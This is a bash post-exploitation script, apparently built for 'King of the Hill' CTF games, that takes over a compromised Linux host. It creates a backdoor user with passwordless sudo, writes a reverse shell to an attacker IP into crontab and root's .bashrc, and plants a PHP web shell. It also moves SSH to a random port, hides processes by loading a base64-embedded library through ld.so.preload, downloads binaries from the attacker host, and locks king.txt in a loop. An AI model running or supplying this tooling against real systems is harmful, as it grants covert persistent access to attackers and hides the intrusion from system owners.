#!/bin/bash


## made by #blvckmetxl

# --> READ: you should change the password in the beginning of the `persist` function, default is 'hahaha1234hahaha'

nickname=
ip=
port=
revsh="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
ssh="/etc/ssh/sshd_config"

hider="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"

function nyan() {
  # https://github.com/klange/nyancat
  
  wget http://$ip/nyancat
  chmod +x nyancat
  mv -f nyancat /usr/bin/nyancat
}

function persist() {
  # adding user with your nickname
  useradd -m $nickname -s /bin/bash
  sudo sed -i "s/$nickname:x:/$nickname:qpQzOFb2UGjtE:/g" /etc/passwd #< -- change password hash here
  echo "$nickname ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

  # backdoors ;D
  echo "* * * * * root $revsh" >> /etc/crontab
  echo $revsh >> /root/.bashrc
  echo; echo; echo "<?php system(\$_GET['cmd']); ?>" >> $RANDOM.php; echo "[+] `ls -Art | tail -n 1` IS YOUR PHP BACKDOOR!"; echo; echo
}

function ssh() {
  # changes ssh port to random number generated by $RANDOM
  
  sed -i 's/Port/#Port/g' $ssh
  echo "Port $RANDOM" >> $ssh

  echo; echo; echo "[+] NEW PORT IS `tail -n 1 $ssh | cut -d' ' -f2`!"; echo; echo
  systemctl restart sshd.service
}

function stealth() {
  # https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c
  
  if grep -Fxq "/usr/lobal/lib/hider.so" /etc/ld.so.preload
  then
    :
  else
    echo "$hider" | base64 -d > tar.gz && tar -xzvf tar.gz
    mv hider.so /usr/local/lib/ && echo /usr/local/lib/hider.so >> /etc/ld.so.preload
  fi
}

function koth() {
  # repeatedly puts your name in king.txt
  
  rm chattr 2>/dev/null; rm -f $(which chattr) 2>/dev/null
  wget http://$ip/chattr && chmod 744 chattr
  
  while :
  do
    ./chattr -ai /root/king.txt
    echo "$nickname" > /root/king.txt
    ./chattr +ai /root/king.txt
  done
}

if [ "$#" -gt 0 ]
then
  case "$1" in
        a) persist; sleep 2
           ssh; sleep 2
           stealth
           nyan
           koth;;
        -a)persist; sleep 2
           ssh; sleep 2
           stealth
           nyan
           koth;;

        p) persist;;
        -p)persist;;

        n) nyan;;
        -n)nyan;;

        s) ssh;;
        -s)ssh;;
  esac
else
  # if no arguments given, just check perform stealth check and execute koth function
  stealth
  koth
fi
